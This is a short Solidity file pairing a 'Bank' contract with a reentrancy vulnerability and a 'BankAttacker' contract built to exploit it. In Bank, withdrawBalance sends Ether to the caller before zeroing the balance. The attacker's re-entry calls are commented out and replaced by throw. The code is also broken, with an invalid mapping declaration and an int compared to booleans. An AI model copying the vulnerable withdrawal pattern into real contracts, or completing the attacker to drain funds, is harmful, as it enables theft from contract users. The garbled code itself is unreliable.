
contract Bank{

   mapping(address->uint) userBalances; 

   function getUserBalance(address user)  returns(uint) {
     return userBalances[user];
   }

   function addToBalance() {
     userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
   }

   function withdrawBalance() {
     uint amountToWithdraw = userBalances[msg.sender];
     if (msg.sender.call.value(amountToWithdraw)() == false) {
         throw;
     }
     userBalances[msg.sender] = 0;
   }
}

contract BankAttacker{

   int is_attack;
   address bankAddress;

   function  BankAttacker(address _bankAddress, int _is_attack){
       bankAddress=_bankAddress;
       is_attack=_is_attack;
   }


   function() {

       if(is_attack==true)
       {
           is_attack=false;
           //if(bankAddress.call(bytes4(sha3("withdrawBalance()")))) {
               throw;
          // }
       }
   }

   function  deposit(){

        //if(bankAddress.call.value(2).gas(20764)(bytes4(sha3("addToBalance()"))) == false) {
            throw;
        //}

   }

   function  withdraw(){
        //if(bankAddress.call(bytes4(sha3("withdrawBalance()"))) == false ) {
               throw;
        //}

   }
}

